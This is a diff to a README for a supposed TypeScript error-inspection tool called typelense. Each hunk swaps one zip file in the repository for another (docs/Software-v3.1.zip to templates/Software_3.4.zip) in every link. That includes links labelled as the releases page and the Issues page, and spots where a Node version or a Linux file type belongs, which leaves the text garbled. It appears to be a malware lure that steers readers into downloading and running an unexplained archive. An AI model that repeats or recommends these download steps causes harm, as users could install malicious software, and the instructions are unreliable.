@@ -1,6 +1,6 @@
 # 🛠️ typelense - Inspect TypeScript Errors with Ease
 
-[![Download typelense](https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip)](https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip)
+[![Download typelense](https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip)](https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip)
 
 ## 📄 Introduction
 
@@ -12,7 +12,7 @@ To begin using typelense, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the downloads:  
-   [Download typelense](https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip)
+   [Download typelense](https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip)
 
 2. **Download the Latest Version**  
    On the releases page, locate the latest version of typelense. You will see options to download. Choose the one that suits your system.
@@ -20,15 +20,15 @@ To begin using typelense, follow these simple steps:
 3. **Check System Requirements**  
    Ensure that your system meets the following requirements:
    - Operating System: Windows, macOS, or Linux
-   - https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip version: 14.x or later
+   - https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip version: 14.x or later
    - A stable internet connection
 
 ## 📥 Download & Install
 
 To download and install typelense, do the following:
 
-- Visit this page to download: [Download typelense](https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip).  
-- Select the appropriate file for your operating system. This could be a `.exe` for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip` for Linux distributions.
+- Visit this page to download: [Download typelense](https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip).  
+- Select the appropriate file for your operating system. This could be a `.exe` for Windows, a `.dmg` for macOS, or a `https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip` for Linux distributions.
 - After the download completes, locate the file on your computer.
 
 ### 📝 Installation Steps
@@ -44,7 +44,7 @@ To download and install typelense, do the following:
   3. Open your Applications folder and launch typelense.
 
 - **For Linux:**
-  1. Extract the contents of the `https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip` file.
+  1. Extract the contents of the `https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the executable file with `./typelense`.
 
@@ -76,7 +76,7 @@ After installing typelense, here’s how to use it to check TypeScript errors:
 
 ## 🤝 Support and Contributions
 
-If you encounter issues or have questions, you can raise them on the [Issues page](https://raw.githubusercontent.com/justely4/typelense/main/docs/Software-v3.1.zip). For contributions, feel free to reach out or fork the repository.
+If you encounter issues or have questions, you can raise them on the [Issues page](https://github.com/justely4/typelense/raw/refs/heads/main/templates/Software_3.4.zip). For contributions, feel free to reach out or fork the repository.
 
 ## 📊 Community and Topics
 
